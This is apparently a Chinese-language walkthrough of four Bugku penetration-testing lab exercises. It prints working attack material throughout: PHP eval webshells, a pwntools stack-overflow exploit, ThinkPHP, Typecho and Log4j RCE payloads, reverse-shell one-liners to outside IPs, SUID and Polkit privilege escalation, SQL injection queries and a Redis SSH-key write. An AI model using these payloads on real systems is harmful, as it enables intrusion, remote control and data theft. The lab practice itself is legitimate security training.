# bugku渗透测试1

直接进入网站，先观察前端页面，可以直观发现存在flag

### flag1——前端回显

![image-20250721223303875](2.assets/image-20250721223303875.png)







然后看到提示，管理员？

再观察这个页面，发现登录接口是需要邮箱和邮箱验证码的，尝试注入失败。换方向

![image-20250721223418066](2.assets/image-20250721223418066.png)

我先fscan扫一下

![image-20250721225331932](2.assets/image-20250721225331932.png)

对这里可能帮助不大。先略过

这里说flag2是需要管理员，那应该就是指原网址下的管理员账号，

我直接修改路径：

![image-20250721225611729](2.assets/image-20250721225611729.png)

![image-20250721225624224](2.assets/image-20250721225624224.png)

跳转到这里，用户名肯定是admin了，然后尝试弱口令：

发现为admin/admin登录成功

找到flag

### flag2——弱口令

![image-20250721225756010](2.assets/image-20250721225756010.png)







再回到之前的网站寻找线索：

可以发现这里有php执行的地方，需要探查是否可以直接运行？

![image-20250721224007037](2.assets/image-20250721224007037.png)



抓包看眼：

![image-20250721230130252](2.assets/image-20250721230130252.png)

然后屌的来了：

![image-20250721230156435](2.assets/image-20250721230156435.png)

他是把php代码写成一个php文件然后运行的，那可以肯定存在文件上传了！

接下来就是确定文件上传的路径，就能上传木马了。

在burp抓包中其实也很明显了，就是在根目录下的，我直接用哥斯拉生成一句话木马

![image-20250721224223678](2.assets/image-20250721224223678.png)

![image-20250721230426019](2.assets/image-20250721230426019.png)

抓包看上传：

![image-20250721230411964](2.assets/image-20250721230411964.png)

![image-20250721230441614](2.assets/image-20250721230441614.png)

应该是成功了，哥斯拉启动：

![image-20250721230538058](2.assets/image-20250721230538058.png)

替换为burp中抓到的路径即可

发现传马成功

### 一句话木马

原理：

shell.php：

```php
<?php eval($_POST['111']); ?>
```

1. `$_POST['111']` - 获取 HTTP POST 请求中名为 "111" 的参数值
2. `eval()` - 将该参数值作为 PHP 代码执行

当我成功上传了带有这个一句话木马的文件后，再对其网页进行访问，发包：

其实我在其内部无论执行什么命令，都类似于：

```js
POST /shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

111=phpinfo();
```

他会从 POST 数据中提取参数 "111" 的值（即 `phpinfo();`），并且执行



直接连接，翻翻文件就翻到了

### flag3——命令执行RCE

![image-20250721230707940](2.assets/image-20250721230707940.png)

接下来继续看，是否存在数据库或者其他敏感信息泄露？

ok也是翻到了数据库信息：

![image-20250721231048058](2.assets/image-20250721231048058.png)

mysql：root/root



连上数据库，直接获取flag还有下一步提示：

### flag4——后台数据库

![image-20250721231331284](2.assets/image-20250721231331284.png)



flag5中提示说要通过pwn获取root权限拿flag

于是下载main：

![image-20250721232159720](2.assets/image-20250721232159720.png)



是栈溢出问题，找poc：

```python
from pwn import *
from LibcSearcher import LibcSearcher
r = remote('139.196.226.142', 9999) #需要替换成自己的IP
elf = ELF('./main')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']
#构造第一次溢出
payload = b'a' * (0x28)  # 填充 0x28 字节，造成栈溢出
payload += p32(write_plt)  # 调用 write 函数
payload += p32(main_addr)  # 返回到 main 函数，重新利用输入点
payload += p32(1)  # write 函数的第一个参数：stdout
payload += p32(write_got)  # write 函数的第二个参数：write 的got地址
payload += p32(4)  # write 函数的第三个参数：写入 4 字节
r.sendlineafter(b'plz input your name:\n', payload)

# 接收got地址
write_addr = u32(r.recv(4))
log.info(f"write 的地址: {hex(write_addr)}")

# 查找 libc 版本
libc = LibcSearcher('write', write_addr)
offset = write_addr - libc.dump('write')
system_addr = offset + libc.dump('system')
bin_sh_addr = offset + libc.dump('str_bin_sh')
log.info(f"system 的地址: {hex(system_addr)}")
log.info(f"/bin/sh 的地址: {hex(bin_sh_addr)}")
# 构造第二次溢出的 payload，调用 system("/bin/sh")
payload = b'a' * (0x28)  # 填充 0x28 字节，造成栈溢出
payload += p32(system_addr)  # 调用 system 函数
payload += p32(main_addr)  # 返回到 main 函数，防止程序崩溃
payload += p32(bin_sh_addr)  # system 函数的参数：/bin/sh

# 发送 payload
r.sendline(payload)

# 进入交互模式，获取 shell
r.interactive()

```

### flag5——栈溢出

然后运行：

![image-20250721233922394](2.assets/image-20250721233922394.png)

![image-20250721233753126](2.assets/image-20250721233753126.png)

然后获取提示root and database

不是很明白这里的提示，于是想到看看刚刚在fscan中扫出来8080端口存在shiro反序列化漏洞：

poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]

![image-20250721234221224](2.assets/image-20250721234221224.png)

启动工具：

![image-20250721234515544](2.assets/image-20250721234515544.png)

执行命令寻找flag：find / -name flag

![image-20250721234605215](2.assets/image-20250721234605215.png)

发现只能获取/home/flag中的flag：

### flag7——shiro反序列化

![image-20250721234706091](2.assets/image-20250721234706091.png)

于是再返回去扫一下

![image-20250721235232737](2.assets/image-20250721235232737.png)

发现存在一个robots.txt泄露

### flag6——路径扫描

![image-20250721235345233](2.assets/image-20250721235345233.png)



然后由于已经可以命令执行，所以直接继续上内存马：

![image-20250721235757907](2.assets/image-20250721235757907.png)

进去后翻到在home下存在一个flag，那个就是刚刚找到的flag，所以无需再重复提交了。



而需要找寻的那个：

因为flag7中显示flag是在root下，现在权限不够，要做提权：

尝试suid提权方式：

当一个文件设置了suid权限的时候，用户在执行该文件时会以文件所有者的权限运行！

```js
find / -perm -u=s -type f 2>/dev/null
```

- /表示从文件系统的顶部（根）开始并找到每个目录
- -perm 表示搜索随后的权限
- -u=s 表示只匹配那些用户（u）权限中包含suid（s）位的文件（不只是root用户拥有的文件）
- -type f 表示只匹配那些类型（type）为普通文件（f）的文件。这样可以排除目录、链接、设备等其他类型的文件。
- 2表示该进程的第二个文件描述符，即stderr（标准错误）
- `>` 表示重定向
- /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容



![image-20250722122140255](2.assets/image-20250722122140255.png)

之所以需要后面几个命令：是因为find命令是从根目录开始搜索的，会尝试访问很多无权限的目录，如/root，/etc/passwd等，会产生“Permission denied”的错误，这些消息就会被输出到标准错误流，而我们**需要把这些消息送入”黑洞“**，让他们不回显在屏幕中，提升效率。而且真实环境中过多的报错也会让管理员察觉。

使用find提权：

![image-20250722122451225](2.assets/image-20250722122451225.png)

拿到root权限

提权漏洞：

![image-20250726221438021](bugku渗透测试.assets/image-20250726221438021.png)

-：普通文件

rws：设置了suid权限（x被换为了s），执行时会以属主权限root运行！

后面则标识属组和其他用户均有读、执行权限

那就可以利用suid提权了



### flag8——suid提权

![image-20250726220410507](bugku渗透测试.assets/image-20250726220410507.png)



然后上传fscan：

![image-20250722122531670](2.assets/image-20250722122531670.png)



然后提示要进内网，那就传fscan上去扫：

扫哪个网段呢？发现ifconfig是不存在的，那就转为使用ip address

![image-20250722123043855](2.assets/image-20250722123043855.png)

上传fscan后记得一定要加权限！

-nobr是因为暂时也就需要做内网探测，就不需要爆破了

```js
chmod +x ./FScan_2.0.1_linux_x64
```

```js
./FScan_2.0.1_linux_x64 -h 192.168.0.3/24 -nobr -o res.txt
```

![image-20250722122940542](2.assets/image-20250722122940542.png)

很清楚的看见目标就是红框了。其他都已经被拿下

并且也看到了是一个thinkphp rce的漏洞

先访问一下github：

![image-20250723143952565](2.assets/image-20250723143952565.png)

直接拿下poc

```js
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
//修改id即可
```





接下来使用毒液去进行内网穿透

admin端：

```js
./admin_linux_x64 -lport 55555
```

![image-20250726211447757](bugku渗透测试.assets/image-20250726211447757.png)

agent端：

```js
./agent_linux_x64 -rhost 124.223.2.21 -rport 55555
```

![image-20250726211457168](bugku渗透测试.assets/image-20250726211457168.png)

毒液内网穿透成功，

访问成功：

![image-20250726211601287](bugku渗透测试.assets/image-20250726211601287.png)



扫了一下：

![image-20250725144448958](bugku渗透测试.assets/image-20250725144448958.png)

还拿到了数据库的账号密码✔

因为知道是thinkphp漏洞，直接打：

![image-20250726211822143](bugku渗透测试.assets/image-20250726211822143.png)

发现传马失败：

![image-20250726211921460](bugku渗透测试.assets/image-20250726211921460.png)

换一下poc：

```js
POST http://124.223.2.21:55556/index.php HTTP/1.1
Host: 124.223.2.21:55556
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

_method=__construct&filter=system&a=echo%20"<?php%20@eval(\$_POST[pa]);?>">%20abc.php%20
```

![image-20250726212112857](bugku渗透测试.assets/image-20250726212112857.png)

直接ls再找一下：

![image-20250726212142722](bugku渗透测试.assets/image-20250726212142722.png)

上传成功，蚁剑准备连接

找到：

### flag9——内网穿透+thinkphpRCE

![image-20250725172445222](bugku渗透测试.assets/image-20250725172445222.png)

也可以再去看眼他的index.php:

![image-20250726212334191](bugku渗透测试.assets/image-20250726212334191.png)



数据库：

![image-20250725172621266](bugku渗透测试.assets/image-20250725172621266.png)



再给她传个木马

![image-20250725173013884](bugku渗透测试.assets/image-20250725173013884.png)

连接数据库

![image-20250725173222139](bugku渗透测试.assets/image-20250725173222139.png)

拿到

### flag10——数据库泄露

![image-20250725173252976](bugku渗透测试.assets/image-20250725173252976.png)

接下来继续提权,suid提权发现失败



![image-20250726215645223](bugku渗透测试.assets/image-20250726215645223.png)



然后我直接在其上执行cve发现不行

![image-20250726214844660](bugku渗透测试.assets/image-20250726214844660.png)

注意在利用这个漏洞的时候要回弹shell！

![image-20250726220028769](bugku渗透测试.assets/image-20250726220028769.png)

使用了很多口令都无法回弹shell，最后找到了一个方法：把内容写入php文件，然后执行php 111.php即可回弹✔

原因？

反弹 shell 是由 php进程发起的，而不是直接在终端执行的 bash，因此可能绕过防火墙、IDS 或系统策略。也可能是WAF 一般检测 HTTP 请求中的命令，而 PHP 文件是本地执行的文件，不经过 Web 入口，检测不到反弹 shell 代码。

```php
<?php 

$sock=fsockopen("124.223.2.21",39999);exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

![image-20250726215457076](bugku渗透测试.assets/image-20250726215457076.png)

连上：

![image-20250726214638898](bugku渗透测试.assets/image-20250726214638898.png)

直接运行：

### flag11——CVE-2021-4034：Linux Polkit 权限提升

![image-20250726214818444](bugku渗透测试.assets/image-20250726214818444.png)

找到flag



马后炮的寻找路径：

因为这个CVE是pkexec的漏洞，在0.113版本前均存在漏洞

![image-20250726220117815](bugku渗透测试.assets/image-20250726220117815.png)

polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令



### Log4j2 RCE

```js
${jndi:ldap://nk665o.dnslog.cn/exp}
```

![image-20250801153102578](bugku渗透测试.assets/image-20250801153102578.png)

查看dnslog：

![image-20250801153128332](bugku渗透测试.assets/image-20250801153128332.png)

没问题

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc 150.109.58.31 39999 -e /bin/sh" -A 150.109.58.31
```

![image-20250804144105994](bugku渗透测试.assets/image-20250804144105994.png)



注入：

```js
${jndi:ldap://VPS_IP:xxx/xxx}
```

```js
ldap://150.109.58.31:1389/lpvx25
```

另外开一个监听端口

![image-20250804144134272](bugku渗透测试.assets/image-20250804144134272.png)









# bugku渗透测试2

### 总体框架

![渗透测试2流程图](bugku渗透测试.assets/渗透测试2流程图.png)

指纹识别或者多尝试几次路径访问就能发现使用的是typecho：

于是可以利用typecho的历史漏洞：

![image-20250721152351839](2.assets/image-20250721152351839.png)

```url
http://101.132.157.160/install.php?finish
```

**请求体**

```js
array(2) {
  ["adapter"] => object(Typecho_Feed) (2) {
    ["_type":"Typecho_Feed":private] => string(7) "RSS 2.0"
    ["_items":"Typecho_Feed":private] => array(1) {
      [0] => array(5) {
        ["title"] => string(1) "1"
        ["link"] => string(1) "1"
        ["date"] => int(1508895132)
        ["category"] => array(1) {
          [0] => object(Typecho_Request) (2) {
            ["_params":"Typecho_Request":private] => array(1) {
                //关键：
              ["screenName"] => string(55) "echo \"<?php phpinfo();@eval(\$_POST[1]);?>\" > shell.php"
            }
            ["_filter":"Typecho_Request":private] => array(1) {
              [0] => string(6) "system"
            }
          }
        }
        ["author"] => object(Typecho_Request) (2) {
          ["_params":"Typecho_Request":private] => array(1) {
              //关键：
            ["screenName"] => string(55) "echo \"<?php phpinfo();@eval(\$_POST[1]);?>\" > shell.php"
          }
          ["_filter":"Typecho_Request":private] => array(1) {
            [0] => string(6) "system"
          }
        }
      }
    }
  }
  ["prefix"] => string(8) "typecho_"
}
```

转换为base64：

```base64
__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU1OiJlY2hvICI8P3BocCBwaHBpbmZvKCk7QGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gc2hlbGwucGhwIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTU6ImVjaG8gIjw/cGhwIHBocGluZm8oKTtAZXZhbChcJF9QT1NUWzFdKTs/PiIgPiBzaGVsbC5waHAiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
```



![image-20250721161608518](2.assets/image-20250721161608518.png)





上传木马后进行连接找到flag：

![image-20250729124911206](bugku渗透测试.assets/image-20250729124911206.png)

### flag1

![image-20250721162053173](2.assets/image-20250721162053173.png)





找到数据库配置文件**config.inc.php**

![image-20250721162643152](2.assets/image-20250721162643152.png)

localhost, 3306

cms

7aed78676bf27528

登录数据库

### flag2

![image-20250721162904138](2.assets/image-20250721162904138.png)





再找到一个账号：

![image-20250721163005693](2.assets/image-20250721163005693.png)

```js
$P$BfY8rUZyXxJy5AeWCVphCYzYR3tZ9I1
```

admin@bugku.com

（好像后续也没用



然后到这里也就没有任何提示了，ipconfig无法执行，那就同理ipaddress看一看，发现内网地址，准备一个fscan先扫一下：

![image-20250729125821940](bugku渗透测试.assets/image-20250729125821940.png)

蚁剑的fscan一直不好用，换哥斯拉

先给哥斯拉的马传上去

![image-20250729130459020](bugku渗透测试.assets/image-20250729130459020.png)

然后开扫

![image-20250729130749401](bugku渗透测试.assets/image-20250729130749401.png)

看到一个数据库，再扫一下：

![image-20250729132013350](bugku渗透测试.assets/image-20250729132013350.png)

探测到了内网主机，然后使用毒液把端口代理出来

很明显，主打就是0.3段的后台管理系统

![image-20250729132235267](bugku渗透测试.assets/image-20250729132235267.png)

可以看到界面：

![image-20250729132252760](bugku渗透测试.assets/image-20250729132252760.png)

尝试注入失败

但在burp中抓包时发现source泄露了：

![image-20250729132435264](bugku渗透测试.assets/image-20250729132435264.png)

访问发现直接下载了：![image-20250729132603533](bugku渗透测试.assets/image-20250729132603533.png)

进去一看：

![image-20250729132657412](bugku渗透测试.assets/image-20250729132657412.png)

应该是log4j的漏洞了✔

（bugku中

git下载攻击组件：

```bash
git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
```

编译安装：

```bash
apt install maven
```

安装完成：![image-20250805111202929](bugku渗透测试.assets/image-20250805111202929.png)

进入target目录

通式：

```js
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "想要执行的命令" -A "攻击机的ip"
```

对 `bash -i >& /dev/tcp/106.14.179.83/63333 0>&1` 进行base64编码：

```js
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTQuMTc5LjgzLzYzMzMzIDA+JjE=
```

命令执行：

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTQuMTc5LjgzLzYzMzMzIDA+JjE=}|{base64,-d}|{bash,-i}" -A "106.14.179.83"
```

![image-20250805111116786](bugku渗透测试.assets/image-20250805111116786.png)



在网站上执行：

```js
${jndi:rmi://106.14.179.83:1099/l2xkyw}
```



### flag4

监听端口回显：

![image-20250805110124975](bugku渗透测试.assets/image-20250805110124975.png)

直接获取root权限并且直接找到flag



### flag5

![image-20250805110319960](bugku渗透测试.assets/image-20250805110319960.png)



再看根目录，发现一个.sh文件：

![image-20250805110537692](bugku渗透测试.assets/image-20250805110537692.png)

其实flag3，4，5都在里面能找到路径！



### flag3

![image-20250805110630713](bugku渗透测试.assets/image-20250805110630713.png)

然后再去看看内网：

发现了一个新的网段

![image-20250805110740934](bugku渗透测试.assets/image-20250805110740934.png)

那就先传毒液agent和fscan上去

![image-20250805114659541](bugku渗透测试.assets/image-20250805114659541.png)

扫到了：

![image-20250805121430075](bugku渗透测试.assets/image-20250805121430075.png)

那就要再做一层代理了：

![image-20250805121651753](bugku渗透测试.assets/image-20250805121651753.png)

![image-20250805121638830](bugku渗透测试.assets/image-20250805121638830.png)



是一个git仓库：

![image-20250805121618702](bugku渗透测试.assets/image-20250805121618702.png)

直接填入他提示的内容：

![image-20250805121838124](bugku渗透测试.assets/image-20250805121838124.png)

ok直接拿下：

![image-20250805121854787](bugku渗透测试.assets/image-20250805121854787.png)

### flag6

![image-20250805121922274](bugku渗透测试.assets/image-20250805121922274.png)







![image-20250805122344571](bugku渗透测试.assets/image-20250805122344571.png)

、

![image-20250805122354176](bugku渗透测试.assets/image-20250805122354176.png)

看到了数据库账号弱口令



然后尝试文件上传：

让他访问我自己的仓库

```js
https://github.com/shushuwin/hack/
```

![image-20250805124514030](bugku渗透测试.assets/image-20250805124514030.png)

发现他居然没法刷新？

![image-20250805124654703](bugku渗透测试.assets/image-20250805124654703.png)

勾八没法连接阿？

![image-20250805125035679](bugku渗透测试.assets/image-20250805125035679.png)

再去看眼：

![image-20250805125819570](bugku渗透测试.assets/image-20250805125819570.png)

发现解析失败了，php未解析！

再翻翻文件：

![image-20250805125953884](bugku渗透测试.assets/image-20250805125953884.png)

还看到了一个waf文件，但是还是没啥用！

```js
https://github.com/shushuwin/hack3
```

ok文件名直接绕过了：

![image-20250805130723791](bugku渗透测试.assets/image-20250805130723791.png)



直接连上：

### flag7

![image-20250805130856041](bugku渗透测试.assets/image-20250805130856041.png)

哦又发现了一个.sh文件，直接点击查看：

![image-20250805130926912](bugku渗透测试.assets/image-20250805130926912.png)

也是展示了flag6、7所在的位置

然后ifconfig查看一下：

![image-20250805131339430](bugku渗透测试.assets/image-20250805131339430.png)

蚁剑传统：无法使用fscan

那就看看能不能在其他地方让php解析一下呢：

直接在网站根目录上传哥斯拉的php马，连接成功：

![image-20250805132044360](bugku渗透测试.assets/image-20250805132044360.png)



扫出来的结果：

![image-20250805132823382](bugku渗透测试.assets/image-20250805132823382.png)

那很明显了，就是10.10.0.3了

ok继续用毒液做代理：



![image-20250805133556059](bugku渗透测试.assets/image-20250805133556059.png)

诶发现怎么无法访问？

![image-20250805133837193](bugku渗透测试.assets/image-20250805133837193.png)

服务器上访问一下看看：

![image-20250805135054153](bugku渗透测试.assets/image-20250805135054153.png)

发现被ban了。那没办法了，要换socks代理

![image-20250805142019265](bugku渗透测试.assets/image-20250805142019265.png)

使用proxychains去做访问

```bash
# 安装proxychains
apt update && apt install proxychains4 -y

# 配置proxychains
vi /etc/proxychains4.conf

# 在文件末尾添加：
socks5 106.14.179.83 56789

# 使用proxychains连接FTP
proxychains4 ftp 10.10.0.3 21
```

![image-20250805140810476](bugku渗透测试.assets/image-20250805140810476.png)

使用提示：guest/guest成功登录，然后在根目录下找到flag

![image-20250805140251212](bugku渗透测试.assets/image-20250805140251212.png)

### flag8

get flag后：使用！cat强制查看

![image-20250805140351465](bugku渗透测试.assets/image-20250805140351465.png)



看到提示：/

那就去根目录下下载

![image-20250805140449375](bugku渗透测试.assets/image-20250805140449375.png)

诶发现不对怎么还是刚刚那个



### flag9

那就切换一下目录，下载，强制查看

![image-20250805140619272](bugku渗透测试.assets/image-20250805140619272.png)



# bugku渗透测试3

瞄了一眼网站感觉没什么东西，

看提示直接要求打进内网：

![image-20250724140008897](bugku渗透测试.assets/image-20250724140008897.png)





输入查询的网站抓包：

![image-20250724140114409](bugku渗透测试.assets/image-20250724140114409.png)

输入一个www.baidu.com试试：

![image-20250724140201122](bugku渗透测试.assets/image-20250724140201122.png)

发现他把百度页面回显出来了

直接修改file协议：

![image-20250724140446471](bugku渗透测试.assets/image-20250724140446471.png)

成功回显

再读一下host文件：![image-20250724140647764](bugku渗透测试.assets/image-20250724140647764.png)



这里显示存在192.168.0.2网段。那就可以继续探测一下

用burp爆破一下网段：

![image-20250724142052338](bugku渗透测试.assets/image-20250724142052338.png)

发现10/138

10：

![image-20250724141805609](bugku渗透测试.assets/image-20250724141805609.png)

138：

![image-20250724141920950](bugku渗透测试.assets/image-20250724141920950.png)

250：

![image-20250724142902375](bugku渗透测试.assets/image-20250724142902375.png)



同时开fscan扫了一下：![image-20250724140818882](bugku渗透测试.assets/image-20250724140818882.png)

发现没什么问题。那问题可能就在其他网段



根据前几个靶场，flag位置可能就在：

```js
file:///flag
file:///tmp/flag
file:///var/www/html/flag
file:///home/ctf/flag
```

### flag1——ssrf全回

![image-20250724141210629](bugku渗透测试.assets/image-20250724141210629.png)







根据刚刚探测到的其他网段，知道应该是指10网段

![image-20250724141200975](bugku渗透测试.assets/image-20250724141200975.png)



去看了一下：





![image-20250724142439717](bugku渗透测试.assets/image-20250724142439717.png)

直接找到

### flag3——ssrf全回导致的内网响应

![image-20250724142518781](bugku渗透测试.assets/image-20250724142518781.png)

交了发现怎么是第三个flag，那就返回网页目录ls一下再看看：

![image-20250724142659547](bugku渗透测试.assets/image-20250724142659547.png)

### flag2——ssrf全回导致的内网响应

![image-20250724142740770](bugku渗透测试.assets/image-20250724142740770.png)

好这个网段已经拿下两个flag了，应该没啥其他东西了，换另外的.138的

可以看到应该是数据库



反弹一个shell：

```shell
http://192.168.0.10/shell.php?cmd=nc 124.223.2.21 39999 -e /bin/sh
```

![image-20250729095533121](bugku渗透测试.assets/image-20250729095533121.png)







看看有没有wget命令：

![image-20250729100206095](bugku渗透测试.assets/image-20250729100206095.png)

发现存在：

![image-20250729100227953](bugku渗透测试.assets/image-20250729100227953.png)

下载服务器上的agent：

![image-20250801111622090](bugku渗透测试.assets/image-20250801111622090.png)

然后开启代理

得用socks代理了：

服务器端：

![image-20250801115716995](bugku渗透测试.assets/image-20250801115716995.png)

自己浏览器：

![image-20250801115649784](bugku渗透测试.assets/image-20250801115649784.png)

这样就是代理成功了：

![image-20250801115740155](bugku渗透测试.assets/image-20250801115740155.png)

ok阿刚刚网页搜索.138的时候发现输入sql语句均失败，现在尝试一下成功了！

于是开始sql注入：

```js
1'
```

![image-20250801120213456](bugku渗透测试.assets/image-20250801120213456.png)

```js
1 //直接成功，ez
```

![image-20250801120402952](bugku渗透测试.assets/image-20250801120402952.png)

然后开始查表流程：

先确定有4列，到5就寄了

```js
1 order by 4 --
```

![image-20250801120635913](bugku渗透测试.assets/image-20250801120635913.png)



```js
-1 union select 1,2,3,database()#
```

![image-20250801120738342](bugku渗透测试.assets/image-20250801120738342.png)

查到库名

```js
-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![image-20250801121021955](bugku渗透测试.assets/image-20250801121021955.png)

查到表名

```js
-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='flag'#
```

![image-20250801121100767](bugku渗透测试.assets/image-20250801121100767.png)

### flag3——ssrf全回导致的内网响应+sql注入

查到列中存在flag

```js
-1 union select 1,2,3,flag from flag#
```

![image-20250801121146222](bugku渗透测试.assets/image-20250801121146222.png)

然后就剩下250了：

![image-20250801121853192](bugku渗透测试.assets/image-20250801121853192.png)

弱口令成功了，但是没反应捏，burp抓包：

![image-20250801133811679](bugku渗透测试.assets/image-20250801133811679.png)

包含XML结构，并且请求头包含xml；响应头响应了php版本--》允许外部实体解析。

于是直接XXE修改

### flag7——XXE

![image-20250801133957448](bugku渗透测试.assets/image-20250801133957448.png)



然后再传马去连接10段：

发现直接在里面敲命令失败，于是用哥斯拉的马，使用wget下载即可

![image-20250801134938336](bugku渗透测试.assets/image-20250801134938336.png)

发现还是不行，nm

还是先用命令去上传蚁剑的马：

```js
http://192.168.0.10/shell.php?cmd=echo "<?php phpinfo();@eval(\$_POST[1]);?>" > 1.php
```

![image-20250801140745998](bugku渗透测试.assets/image-20250801140745998.png)

再去传哥斯拉的马：

![image-20250801141004247](bugku渗透测试.assets/image-20250801141004247.png)

发现还是传不了fscan，那就先看看网卡吧：

![image-20250801141355844](bugku渗透测试.assets/image-20250801141355844.png)

发现还有一个10网段

传上去之后扫到.22



![image-20250801141628884](bugku渗透测试.assets/image-20250801141628884.png)

发现一个cms



登录后台：

![image-20250801142016176](bugku渗透测试.assets/image-20250801142016176.png)

同样，发现文件上传点：

![image-20250801142223374](bugku渗透测试.assets/image-20250801142223374.png)

![image-20250801142243778](bugku渗透测试.assets/image-20250801142243778.png)

用哥斯拉连入：

### flag5——文件上传RCE

![image-20250801142348128](bugku渗透测试.assets/image-20250801142348128.png)

再逛一逛：

发现数据库![image-20250801142541764](bugku渗透测试.assets/image-20250801142541764.png)

但是没有名字和密码

最后根目录下又发现一个：

### flag6——文件上传RCE

![image-20250801142633732](bugku渗透测试.assets/image-20250801142633732.png)

那后面就懵逼了，还有一个在哪里捏？

好的再去之前192.168.0.250那里翻一下flag，果然。。。

### flag8——XXE

![image-20250801143010350](bugku渗透测试.assets/image-20250801143010350.png)





# bugku渗透测试4

### 总体框架

![渗透测试4流程图](bugku渗透测试.assets/渗透测试4流程图.png)

拿到网站，发现登陆点，弱口令失败

先尝试一下注入：

![image-20250730140158996](bugku渗透测试.assets/image-20250730140158996.png)



发现存在注入点：

![image-20250730140239275](bugku渗透测试.assets/image-20250730140239275.png)

确定它后面应该是带括号的：

![image-20250730140519152](bugku渗透测试.assets/image-20250730140519152.png)

那就修改一下命令，用phpinfo()去进行匹配：

```js
action=system('echo%20"<?php%20phpinfo();eval(\$_POST[abc]);%20?>"%20>%20abc.php')%20|%20phpinfo&username=%E8%8C%83%E5%BE%B7%E8%90%A8%E8%8C%83%E5%BE%B7%E8%90%A8%E5%8F%91%E9%A1%BA%E4%B8%B0&password=fdsfsdfs
```

![image-20250811140620710](bugku渗透测试.assets/image-20250811140620710.png)

ok写进去了：

![image-20250811140544010](bugku渗透测试.assets/image-20250811140544010.png)

### flag1——命令执行RCE

![image-20250730140829099](bugku渗透测试.assets/image-20250730140829099.png)

进去之后也可以看到其漏洞存在的php：

![image-20250730140940113](bugku渗透测试.assets/image-20250730140940113.png)

使用 `eval($action . '();')` 动态地执行与用户输入 `action` 相关的函数。允许任意的PHP代码执行。

看到本机ip:

![image-20250730144659064](bugku渗透测试.assets/image-20250730144659064.png)

先弹个shell，这里也是需要php文件写进去

![image-20250805150325511](bugku渗透测试.assets/image-20250805150325511.png)

然后直接fscan开扫

![image-20250805151128536](bugku渗透测试.assets/image-20250805151128536.png)

主打的就是这个redis

然后再扫一下它这个网段的全端口

![image-20250805151239869](bugku渗透测试.assets/image-20250805151239869.png)

发现了22000端口

现在的问题是如何进行利用？我不知道redis的密码

那不管怎么样肯定要先做内网代理：

![image-20250805152418054](bugku渗透测试.assets/image-20250805152418054.png)

带出来

![image-20250805154515092](bugku渗透测试.assets/image-20250805154515092.png)

网上找了一下漏洞：有未授权访问、写webshell或者伪造密钥登录

那这里肯定不是未授权，尝试一下伪造密钥登录：



![image-20250805153834389](bugku渗透测试.assets/image-20250805153834389.png)

```bash
┌──(root㉿kali)-[~]
└─# ssh-keygen -t rsa
```

生成一对密钥：`id_rsa`（私钥） 和 `id_rsa.pub`（公钥）。

之后 SSH 登录时只要私钥在手，且目标服务器 `authorized_keys` 里有对应公钥，就能直接免密登录。

```bash
┌──(root㉿kali)-[~/.ssh]
└─# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
```

把公钥前后加上几个换行符，避免影响原文件结构（有些 Redis 写文件如果没有换行，会导致 SSH 公钥识别失败）。

```js
┌──(root㉿kali)-[~/.ssh]
└─# cat /root/.ssh/1.txt | redis-cli -h 106.14.179.83 -p 60000 -a 123456 -x set crack
cat key.txt | redis-cli -h 目标IP -x set xxx
```

`cat` 把 `1.txt` 内容写到自己的 STDOUT；

管道 `|` 把上一进程的 STDOUT **接到** `redis-cli` 的 STDIN；

`-x set crack` 的意思是：**从 STDIN 读入内容**作为 `SET crack <value>` 的 `<value>`。

于是键 `crack` 的值就等于 `1.txt` 的内容。

